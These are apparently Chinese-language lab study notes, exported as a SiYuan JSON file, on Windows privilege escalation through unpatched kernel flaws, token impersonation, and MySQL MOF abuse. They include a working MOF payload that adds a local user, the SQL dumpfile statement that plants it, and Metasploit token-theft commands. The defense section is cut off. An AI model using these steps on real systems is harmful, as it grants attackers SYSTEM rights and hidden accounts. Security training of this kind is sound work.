{"ID":"20241028100816-oqgtae8","Spec":"1","Type":"NodeDocument","Properties":{"icon":"1f989","id":"20241028100816-oqgtae8","scroll":"\u0026#123;\u0026quot;rootId\u0026quot;:\u0026quot;20241028100816-oqgtae8\u0026quot;,\u0026quot;startId\u0026quot;:\u0026quot;20241028100940-e2d0oun\u0026quot;,\u0026quot;endId\u0026quot;:\u0026quot;20241028142412-bu3ck6q\u0026quot;,\u0026quot;scrollTop\u0026quot;:2,\u0026quot;focusId\u0026quot;:\u0026quot;20241029094034-41i28c3\u0026quot;,\u0026quot;focusStart\u0026quot;:5,\u0026quot;focusEnd\u0026quot;:5\u0026#125;","title":"Windows提权","updated":"20241028111759"},"Children":[{"ID":"20241028100940-e2d0oun","Type":"NodeHeading","HeadingLevel":2,"Properties":{"fold":"1","id":"20241028100940-e2d0oun","updated":"20241029085011"},"Children":[{"Type":"NodeText","Data":"系统漏洞提权"}]},{"ID":"20241029085021-9gt0cyc","Type":"NodeBlockquote","Properties":{"fold":"1","heading-fold":"1","id":"20241029085021-9gt0cyc","updated":"20241029085022"},"Children":[{"ID":"20241029084955-omcyffm","Type":"NodeParagraph","Properties":{"id":"20241029084955-omcyffm","updated":"20241029085022"},"Children":[{"Type":"NodeText","Data":"\t系统漏洞提权一般就是利用"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"系统自身缺陷"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"，用来提升权限windows和linux系统均有提权用的可执行文件：\n权限低，受限制的用户  通过系统漏洞提权 至高无上的权限"}]},{"ID":"20241029084955-5zh4cot","Type":"NodeParagraph","Properties":{"id":"20241029084955-5zh4cot","updated":"20241029085022"},"Children":[{"Type":"NodeText","Data":"\t"},{"Type":"NodeTextMark","TextMarkType":"strong","TextMarkTextContent":"常规流程"}]},{"ID":"20241029084955-i7fizxj","Type":"NodeParagraph","Properties":{"id":"20241029084955-i7fizxj","updated":"20241029085022"},"Children":[{"Type":"NodeText","Data":"获取目标shell--查看补丁记录（找没有补丁的）-- 寻找对应的exp -- 使用exp提取"}]},{"Type":"NodeBlockquoteMarker","Data":"\u003e"}]},{"ID":"20241029085028-f6ut0kc","Type":"NodeHeading","HeadingLevel":4,"Properties":{"fold":"1","heading-fold":"1","id":"20241029085028-f6ut0kc","updated":"20241029085034"},"Children":[{"Type":"NodeText","Data":"查看补丁记录"}]},{"ID":"20241029085038-pi381ac","Type":"NodeHeading","HeadingLevel":5,"Properties":{"fold":"1","heading-fold":"1","id":"20241029085038-pi381ac","updated":"20241029091311"},"Children":[{"Type":"NodeText","Data":"systeminfo查看补丁信息"}]},{"ID":"20241029091312-v5whm53","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029091312-v5whm53","updated":"20241029091313"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241029085123-az5lsws.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20241029085130-hmtb7h2","Type":"NodeHeading","HeadingLevel":5,"Properties":{"fold":"1","heading-fold":"1","id":"20241029085130-hmtb7h2","updated":"20241029085210"},"Children":[{"Type":"NodeText","Data":"查询没有安装哪些补丁"}]},{"ID":"20241029085212-32en7av","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"fold":"1","heading-fold":"1","id":"20241029085212-32en7av","updated":"20241029090441"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"#检查系统信息中是否安装了特定的Windows补丁，并报告未安装的补丁。完成后，它会删除临时创建的文本文件\nsysteminfo\u003esnowming.txt\u0026(for %i in (KB4525235 KB4525233) do @type snowming.txt|@find /i \"%i\"|| @echo no this padding: %i)\u0026del /f /g /a snowming.txt\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241028101124-wtpytpi","Type":"NodeHeading","HeadingLevel":4,"Properties":{"fold":"1","heading-fold":"1","id":"20241028101124-wtpytpi","updated":"20241028101150"},"Children":[{"Type":"NodeText","Data":"在线查询工具："}]},{"ID":"20241028101151-t14mbtl","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241028101151-t14mbtl","updated":"20241029090741"},"Children":[{"Type":"NodeTextMark","TextMarkType":"a","TextMarkAHref":"https://blog.neargle.com/win-powerup-exp-index/","TextMarkTextContent":"http://blog.neargle.com/win=powerup-exp-index/#"},{"Type":"NodeText","Data":"\n"},{"Type":"NodeTextMark","TextMarkType":"a","TextMarkAHref":"http://tools.sbbbb.cn/tiquan/","TextMarkTextContent":"http://tools.sbbbb.cn/tiquan/"},{"Type":"NodeTextMark","TextMarkType":"a","TextMarkAHref":"http://bypass.tidesec.com/exp/","TextMarkTextContent":"http://bypass.tidesec.com/exp/"}]},{"ID":"20241028101106-sgoji3l","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241028101106-sgoji3l","updated":"20241028101245"},"Children":[{"Type":"NodeText","Data":"​​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241028101244-lojihf0.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​​"}]},{"ID":"20241028101438-9eptgfn","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241028101438-9eptgfn","updated":"20241028101453"}},{"ID":"20241028101938-nhkkk59","Type":"NodeHeading","HeadingLevel":5,"Properties":{"fold":"1","heading-fold":"1","id":"20241028101938-nhkkk59","updated":"20241028101948"},"Children":[{"Type":"NodeText","Data":"查找对应的提权exp"}]},{"ID":"20241028102024-wqxgupm","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241028102024-wqxgupm","updated":"20241029091118"},"Children":[{"Type":"NodeText","Data":"github中作者整合了大部分windows本地提权用到的exp"}]},{"ID":"20241029091124-9a03gse","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029091124-9a03gse"},"Children":[{"Type":"NodeTextMark","TextMarkType":"a","TextMarkAHref":"https://github.com/SecWiki/windows-kernel-exploits","TextMarkTextContent":"https://github.com/SecWiki/windows-kernel-exploits"}]},{"ID":"20241028102023-02jqeg1","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241028102023-02jqeg1","updated":"20241029091209"},"Children":[{"Type":"NodeText","Data":"​​"},{"Type":"NodeImage","Data":"span","Properties":{"parent-style":"width: 50%;","style":"width: 10000px;"},"Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241029091205-uh87v06.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"width: 10000px;\" parent-style=\"width: 50%;\"}"},{"Type":"NodeText","Data":"​​"}]},{"ID":"20241028102108-gjch5oc","Type":"NodeHeading","HeadingLevel":4,"Properties":{"fold":"1","heading-fold":"1","id":"20241028102108-gjch5oc","updated":"20241028102115"},"Children":[{"Type":"NodeText","Data":"提权步骤"}]},{"ID":"20241028102128-2geeomk","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241028102128-2geeomk","updated":"20241029091424"},"Children":[{"Type":"NodeText","Data":"getshell --- 查看系统补丁---下载exp--上传至提权"}]},{"ID":"20241028102135-dbjyrvv","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241028102135-dbjyrvv","updated":"20241029091457"},"Children":[{"Type":"NodeText","Data":"​​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241029091457-kqp0dej.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​​"}]},{"ID":"20241028102230-obr5iws","Type":"NodeHeading","HeadingLevel":5,"Properties":{"fold":"1","heading-fold":"1","id":"20241028102230-obr5iws","updated":"20241028102237"},"Children":[{"Type":"NodeText","Data":"2012实验"}]},{"ID":"20241029092742-wvkeaa8","Type":"NodeHeading","HeadingLevel":6,"Properties":{"fold":"1","heading-fold":"1","id":"20241029092742-wvkeaa8","updated":"20241029092845"},"Children":[{"Type":"NodeText","Data":"shell连接之后上传ms16-032exp，虚拟终端运行创建用户"}]},{"ID":"20241028104111-rd77cx4","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241028104111-rd77cx4","updated":"20241029092817"},"Children":[{"Type":"NodeText","Data":"​​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241029092817-7l9n5fl.png"},{"Type":"NodeCloseParen"}]}]},{"ID":"20241029092850-pn2qr62","Type":"NodeHeading","HeadingLevel":6,"Properties":{"fold":"1","heading-fold":"1","id":"20241029092850-pn2qr62","updated":"20241029093001"},"Children":[{"Type":"NodeText","Data":"ms16-075配合msf提权，反弹msf配合烂土豆提权"}]},{"ID":"20241029093002-tk9inxz","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"fold":"1","heading-fold":"1","id":"20241029093002-tk9inxz","updated":"20241029093119"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"use incognito #该模块用来窃取令牌、模仿令牌\nlist_tokens -u #列举当前的令牌\nexecute -cH -f ./potato.exe #执行exp\nlist_tokens -u #查看令牌，有一个SYSTEM权限的模仿令牌\nimpersonate_token \"NT AUTHORITY\\SYSTEM\" #执行偷取窃取令牌命令\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241028104131-68yr0g1","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241028104131-68yr0g1","updated":"20241029093126"},"Children":[{"Type":"NodeText","Data":"​​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241029093126-tnvo7iv.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​​"}]},{"ID":"20241029094034-41i28c3","Type":"NodeHeading","HeadingLevel":2,"Properties":{"id":"20241029094034-41i28c3","updated":"20241029094037"},"Children":[{"Type":"NodeText","Data":"数据库提权"}]},{"ID":"20241028104247-peyfrsx","Type":"NodeHeading","HeadingLevel":3,"Properties":{"id":"20241028104247-peyfrsx","updated":"20241028104254"},"Children":[{"Type":"NodeText","Data":"MYSQL数据库提权"}]},{"ID":"20241029094119-2fojsbk","Type":"NodeHeading","HeadingLevel":4,"Properties":{"id":"20241029094119-2fojsbk","updated":"20241029094232"},"Children":[{"Type":"NodeText","Data":"1.必要条件：获取最高权限root密码"}]},{"ID":"20241029094224-vnc33cp","Type":"NodeHeading","HeadingLevel":4,"Properties":{"fold":"1","id":"20241029094224-vnc33cp","updated":"20241029094235"},"Children":[{"Type":"NodeText","Data":"2.获取方法"}]},{"ID":"20241029094238-d3xaihp","Type":"NodeList","ListData":{},"Properties":{"fold":"1","heading-fold":"1","id":"20241029094238-d3xaihp","updated":"20241029095250"},"Children":[{"ID":"20241029094240-3mstt9e","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20241029094240-3mstt9e","updated":"20241029094240"},"Children":[{"ID":"20241029094240-ul13nbq","Type":"NodeParagraph","Properties":{"id":"20241029094240-ul13nbq","updated":"20241029095229"},"Children":[{"Type":"NodeText","Data":"查看数据库"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"配置文件"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"}]},{"ID":"20241029094250-9bfteht","Type":"NodeList","ListData":{},"Properties":{"id":"20241029094250-9bfteht"},"Children":[{"ID":"20241029094249-v8ynu5n","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20241029094249-v8ynu5n"},"Children":[{"ID":"20241029094249-epdu8f5","Type":"NodeParagraph","Properties":{"id":"20241029094249-epdu8f5","updated":"20241029094312"},"Children":[{"Type":"NodeText","Data":"关键字：config conn data sql inc database 等"}]}]}]}]},{"ID":"20241029094315-xrudhqh","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20241029094315-xrudhqh"},"Children":[{"ID":"20241029094315-4rtt9if","Type":"NodeParagraph","Properties":{"id":"20241029094315-4rtt9if","updated":"20241029095226"},"Children":[{"Type":"NodeText","Data":"下载MYSQL安装路径下的"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"数据文件并破解"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"}]},{"ID":"20241029094334-oaettkj","Type":"NodeList","ListData":{},"Properties":{"id":"20241029094334-oaettkj"},"Children":[{"ID":"20241029094333-nz7cr1w","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20241029094333-nz7cr1w"},"Children":[{"ID":"20241029094333-90v4bjw","Type":"NodeParagraph","Properties":{"id":"20241029094333-90v4bjw","updated":"20241029095212"},"Children":[{"Type":"NodeText","Data":"安装路径下的"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"data目录"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"中存放的是数据库的信息"}]}]},{"ID":"20241029095119-tr4lrnc","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20241029095119-tr4lrnc"},"Children":[{"ID":"20241029095119-mohlbql","Type":"NodeParagraph","Properties":{"id":"20241029095119-mohlbql","updated":"20241029095218"},"Children":[{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"root账号密码"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"存储在MYSQL数据下的"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"user表"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"中"}]}]},{"ID":"20241029095137-p065cbp","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20241029095137-p065cbp"},"Children":[{"ID":"20241029095137-4yt9aom","Type":"NodeParagraph","Properties":{"id":"20241029095137-4yt9aom","updated":"20241029095204"},"Children":[{"Type":"NodeText","Data":"完整路径="},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"安装路径+data+mysql+user.myd"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"}]}]}]}]},{"ID":"20241029095232-hm7xabr","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20241029095232-hm7xabr","updated":"20241029095250"},"Children":[{"ID":"20241029095232-f9s2u51","Type":"NodeParagraph","Properties":{"id":"20241029095232-f9s2u51","style":"color: var(--b3-font-color9);","updated":"20241029095236"},"Children":[{"Type":"NodeText","Data":"暴力破解"}]},{"ID":"20241029095238-y1hxtm0","Type":"NodeList","ListData":{},"Properties":{"id":"20241029095238-y1hxtm0","updated":"20241029095250"},"Children":[{"ID":"20241029095238-ub9tku8","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20241029095238-ub9tku8","updated":"20241029095250"},"Children":[{"ID":"20241029095238-ic6an3r","Type":"NodeParagraph","Properties":{"id":"20241029095238-ic6an3r","updated":"20241029095250"},"Children":[{"Type":"NodeText","Data":"Hscan Hydra X-scan等"}]}]}]}]}]},{"ID":"20241028110900-wd7i5rx","Type":"NodeHeading","HeadingLevel":4,"Properties":{"id":"20241028110900-wd7i5rx","updated":"20241029095332"},"Children":[{"Type":"NodeText","Data":"3.提权方法"}]},{"ID":"20241028110923-keb9utt","Type":"NodeHeading","HeadingLevel":5,"Properties":{"fold":"1","id":"20241028110923-keb9utt","updated":"20241028110929"},"Children":[{"Type":"NodeText","Data":"MOF提权"}]},{"ID":"20241028110934-jee8ai6","Type":"NodeHeading","HeadingLevel":6,"Properties":{"fold":"1","heading-fold":"1","id":"20241028110934-jee8ai6","updated":"20241028110935"},"Children":[{"Type":"NodeText","Data":"原理"}]},{"ID":"20241028110951-2b0l6jr","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241028110951-2b0l6jr","updated":"20241029095606"},"Children":[{"Type":"NodeText","Data":"利用了"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"c:/windows/system32/wbem/mof/"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"目录下的 "},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"nullevt.mof "},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"文件"}]},{"ID":"20241029095512-0yeggms","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029095512-0yeggms","updated":"20241029095622"},"Children":[{"Type":"NodeText","Data":"该文件"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"每分钟"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"都会在一个特定的时间去"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"执行一次"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"的特性，通过"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"写入cmd命令"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"使其被带入执行"}]},{"ID":"20241028111027-18pjuem","Type":"NodeHeading","HeadingLevel":6,"Properties":{"fold":"1","heading-fold":"1","id":"20241028111027-18pjuem","updated":"20241028111029"},"Children":[{"Type":"NodeText","Data":"利用条件"}]},{"ID":"20241028111114-xydzohx","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241028111114-xydzohx","updated":"20241029095656"},"Children":[{"Type":"NodeText","Data":"Windows "},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"\u0026lt;= 2003"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"}]},{"ID":"20241029095641-9ru45bc","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029095641-9ru45bc","updated":"20241029095653"},"Children":[{"Type":"NodeText","Data":"对 c:/windows/system32/webm/mof 目录有"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"读写权限"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"}]},{"ID":"20241029095642-t5to6fz","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029095642-t5to6fz","updated":"20241029095713"},"Children":[{"Type":"NodeText","Data":"可以实现写mof文件到相应目录，例如:"},{"Type":"NodeTextMark","TextMarkType":"u","TextMarkTextContent":"数据库允许外联、有webshell、有可写的sql注入漏洞"},{"Type":"NodeText","Data":"等情况"}]},{"ID":"20241028104245-94lkw5s","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241028104245-94lkw5s","updated":"20241028104245"},"Children":[{"Type":"NodeText","Data":"​​"}]},{"ID":"20241029095725-892j5fm","Type":"NodeHeading","HeadingLevel":6,"Properties":{"fold":"1","heading-fold":"1","id":"20241029095725-892j5fm","updated":"20241029095732"},"Children":[{"Type":"NodeText","Data":"提权方法"}]},{"ID":"20241029095734-g4fj7td","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029095734-g4fj7td","updated":"20241029100137"},"Children":[{"Type":"NodeText","Data":"1.可写目录中上传mof文件（创建用户）"}]},{"ID":"20241029100349-ibp03tj","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029100349-ibp03tj","updated":"20241029100357"},"Children":[{"Type":"NodeText","Data":"nullevt.mof文件"}]},{"ID":"20241029100108-ottuw0l","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"fold":"1","heading-fold":"1","id":"20241029100108-ottuw0l","updated":"20241029100130"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"#pragma namespace(\"\\\\\\\\.\\\\root\\\\subscription\")\n\ninstance of __EventFilter as $EventFilter\n{\n\tEventNamespace = \"Root\\\\Cimv2\";\n\tName  = \"filtP2\";\n\tQuery = \"Select * From __InstanceModificationEvent \"\n\t\t\t\"Where TargetInstance Isa \\\"Win32_LocalTime\\\" \"\n\t\t\t\"And TargetInstance.Second = 5\";\n\tQueryLanguage = \"WQL\";\n};\n\ninstance of ActiveScriptEventConsumer as $Consumer\n{\n\tName = \"consPCSV2\";\n\tScriptingEngine = \"JScript\";\n\tScriptText =\n\t\"var WSH = new ActiveXObject(\\\"WScript.Shell\\\")\\nWSH.run(\\\"net.exe user admingua 1qaz@WSX /add\\\")\";\n};\n\ninstance of __FilterToConsumerBinding\n{\n\tConsumer   = $Consumer;\n\tFilter = $EventFilter;\n};\n\n\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241029100401-1uz1es2","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029100401-1uz1es2","updated":"20241029100500"},"Children":[{"Type":"NodeText","Data":"​​"},{"Type":"NodeImage","Data":"span","Properties":{"parent-style":"width: 67%;","style":"width: 10000px;"},"Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241029100453-g798bfw.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"width: 10000px;\" parent-style=\"width: 67%;\"}"},{"Type":"NodeText","Data":"​​"}]},{"ID":"20241029095749-q6d6im0","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029095749-q6d6im0","updated":"20241029095816"},"Children":[{"Type":"NodeText","Data":"2.执行load_file及into dumpfile把文件导出到正确位置"}]},{"ID":"20241029095818-jdit1bg","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"fold":"1","heading-fold":"1","id":"20241029095818-jdit1bg","updated":"20241029100035"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"select load_file('上传的mof文件路径') into dumpfile 'c:/windows/system32/wbem/mof/nullevt.mof'\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241029100551-pbths5m","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029100551-pbths5m","updated":"20241029100607"},"Children":[{"Type":"NodeText","Data":"🌰用DBeaver连接数据库执行mySQL语句，将mof文件到指定位置c:/windows/system32/wbem/mof/nullevt.mof"}]},{"ID":"20241029100618-o4h4wgv","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"fold":"1","heading-fold":"1","id":"20241029100618-o4h4wgv","updated":"20241029100618"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"select load_file('c:/phpstudy/www/nullevt.mof') into dumpfile 'c:/windows/system32/wbem/mof/nullevt.mof' \n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241029100618-0prvrin","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029100618-0prvrin","updated":"20241029100635"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Properties":{"parent-style":"width: 67%;","style":"width: 10000px;"},"Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241028162518-wox9n76.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"width: 10000px;\" parent-style=\"width: 67%;\"}"},{"Type":"NodeText","Data":"​"}]},{"ID":"20241029100617-rzboy1m","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029100617-rzboy1m"}},{"ID":"20241029100039-7h88x5m","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029100039-7h88x5m","updated":"20241029100058"},"Children":[{"Type":"NodeText","Data":"3.执行成功后，验证mof文件中的cmd命令是否执行"}]},{"ID":"20241029100709-qtk8nz2","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029100709-qtk8nz2","updated":"20241029100725"},"Children":[{"Type":"NodeText","Data":"🌰在蚁剑虚拟终端查看是否创建此用户​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241028162628-ke77q59.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20241029100804-ra7w8lb","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029100804-ra7w8lb","updated":"20241029100837"},"Children":[{"Type":"NodeText","Data":"4.同样的方法修改mof文件再重复上次的步骤，可以将用户添加到管理组"}]},{"ID":"20241029100901-eqnln56","Type":"NodeHeading","HeadingLevel":6,"Properties":{"fold":"1","heading-fold":"1","id":"20241029100901-eqnln56","updated":"20241029100910"},"Children":[{"Type":"NodeText","Data":"防御"}]},{"ID":"20241029100917-py89dy9","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029100917-py89dy9","updated":"20241029100949"},"Children":[{"Type":"NodeText","Data":"当发现服务器被使用mof提权，解决继续创建用户的方法:"}]},{"ID":"20241029100949-fesjv75","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029100949-fesjv75","updated":"20241029101004"},"Children":[{"Type":"NodeText","Data":"1.先停止winmgmt服务:net stop;"}]},{"ID":"20241029101004-3o9bmeu","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029101004-3o9bmeu","updated":"20241029101019"},"Children":[{"Type":"NodeText","Data":"2.删除文件夹:c:/windows/system32/wbem/repository"}]},{"ID":"20241029101020-cuwfsi7","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029101020-cuwfsi7","updated":"20241029101024"},"Children":[{"Type":"NodeText","Data":"3.再启动winmgmt服务:net start 